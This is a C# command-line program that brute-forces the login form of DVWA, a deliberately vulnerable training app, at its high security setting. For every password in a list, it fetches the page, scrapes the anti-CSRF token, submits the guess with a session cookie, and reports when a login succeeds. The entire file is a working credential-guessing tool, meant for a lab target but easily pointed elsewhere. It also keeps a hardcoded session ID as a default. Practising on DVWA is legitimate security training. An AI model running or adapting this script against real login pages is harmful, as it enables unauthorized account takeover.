using AngleSharp;
using AngleSharp.Dom;
using System.CommandLine;
using System.IO;

namespace DVWA_BruteForce_HighSecurity
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            // default running: dotnet run --
            // dotnet run -- --username test
            // dotnet run -- --url testurl
            // dotnet run -- --url http://localhost:3000/vulnerabilities/brute/ --username test
            // dotnet run -- --url "http://localhost:3000/vulnerabilities/brute/" --username test
            // dotnet run -- --passwordList "C:\Users\chris\Downloads\PasswordListNewPath.txt"
            // dotnet run -- --passwordList "C:\Users\chris\Downloads\PasswordList.csv"
            // dotnet run -- --phpSessId nmal50l9m8re9sgnreen7a74e6 --username admin

            // TODO: upload as a nuget pacakge with disclaimer. write blog post. 

            var usernameOption = new Option<string>(
                name: "--username",
                description: "The username to use for the login attempts.",
                getDefaultValue: () => "admin");

            var baseUriOption = new Option<string>(
                name: "--url",
                description: "The URL of the login page.",
                getDefaultValue: () => "http://localhost:3000/vulnerabilities/brute/");

            // TODO: delete
            var phpSessIdOption = new Option<string>(
                name: "--phpSessId",
                description: "The PHP Session Id to include with the request headers.",
                getDefaultValue: () => "nmal50l9m8re9sgnreen7a74e6") // TODO: delete default value
            { IsRequired = true };

            // TODO: uncomment
            //var phpSessIdOption = new Option<string>(
            //    name: "--phpSessId",
            //    description: "The PHP Session Id to include with the request headers. " +
            //    "This can be found by using browser DevTools and inspecting the cookies set by DVWA.")
            //{ IsRequired = true };

            var passwordListOption = new Option<string>(
                name: "--passwordList",
                description: "The absolute path to a password list file (TXT or CSV). If no file is specified, a default password list is used."); 

            var rootCommand = new RootCommand("C# script for brute forcing the DVWA high-security login page.");
            rootCommand.AddOption(usernameOption);
            rootCommand.AddOption(baseUriOption);
            rootCommand.AddOption(phpSessIdOption);
            rootCommand.AddOption(passwordListOption);

            rootCommand.SetHandler(async (usernameValue, baseUriValue, phpSessIdValue, passwordListPathValue) =>
            {
                await BruteForceLogin(usernameValue, baseUriValue, phpSessIdValue, passwordListPathValue);
            },
            usernameOption,
            baseUriOption,
            phpSessIdOption,
            passwordListOption);

            await rootCommand.InvokeAsync(args);
        }

        static async Task BruteForceLogin(string _username, string _targetBaseAddressURI, string _phpSessId, string _passwordListPath)
        {
            Console.WriteLine(_username);
            Console.WriteLine(_targetBaseAddressURI);
            Console.WriteLine(_phpSessId);
            Console.WriteLine(_passwordListPath);

            // Initialize AngleSharp settings
            IConfiguration config = Configuration.Default;
            IBrowsingContext context = BrowsingContext.New(config);

            List<string> passwordList = new();

            if(_passwordListPath != null && _passwordListPath != "")
            {
                passwordList = File.ReadLines(_passwordListPath).ToList();
            }
            else
            {
                //Console.WriteLine("Default pass list used");
                //passwordList = File.ReadLines("C:\\Users\\chris\\Documents\\Programming\\C#\\2023\\DVWA-BruteForce-HighSecurity\\DVWA-BruteForce-HighSecurity\\PasswordList.txt").ToList();
                passwordList = File.ReadLines("PasswordList.txt").ToList();
                //var passwordList = File.ReadLines("C:\\Users\\chris\\Documents\\Programming\\C#\\2023\\DVWA-BruteForce-HighSecurity\\DVWA-BruteForce-HighSecurity\\PasswordList.txt").ToList();
                //var passwordList = File.ReadLines("C:\\Users\\chris\\Documents\\Programming\\C#\\2023\\DVWA-BruteForce-HighSecurity\\DVWA-BruteForce-HighSecurity\\PasswordList.csv").ToList();
            }

            //var cookieContents = "PHPSESSID=nmal50l9m8re9sgnreen7a74e6; security=high";
            var cookieContents = $"PHPSESSID={_phpSessId}; security=high";
            // Console.WriteLine(cookieContents);

            //var _targetBaseAddressURI = "http://localhost:3000/vulnerabilities/brute/";
            //var csrfTokenName = "user_token";
            //var _username = "admin";

            using (var httpClient = new HttpClient())
            {
                httpClient.BaseAddress = new Uri(_targetBaseAddressURI);
                httpClient.DefaultRequestHeaders.Add("Cookie", cookieContents);

                foreach (var _password in passwordList)
                {
                    // Make a GET request to the login page and parse for the CSRF token
                    var loginPageResponseBody = await httpClient.GetStringAsync("");
                    var document = await context.OpenAsync(req => req.Content(loginPageResponseBody));
                    var csrfToken = document.QuerySelector($"input[name='user_token']").GetAttribute("value");

                    if (csrfToken == null || csrfToken.Length == 0)
                    {
                        Console.WriteLine($"Error - CSRF token could not be parsed from login page (attempted password: {_password}");
                        continue;
                    }

                    var loginAttemptResponseBody = await httpClient.GetStringAsync($"?username={_username}&password={_password}&Login=Login&user_token={csrfToken}");

                    if (loginAttemptResponseBody.Contains("Username and/or password incorrect"))
                    {
                        Console.WriteLine($"Incorrect password ({_password}).");
                    }
                    else if (loginAttemptResponseBody.Contains("Welcome to the password protected area admin"))
                    {
                        Console.WriteLine($"Valid password found: {_password}.");
                        break;
                    }
                    else
                    {
                        Console.WriteLine($"Error - Unexpected webpage response received after attempting login (attempted password: {_password}.");
                    }
                }
            }
        }
    }
}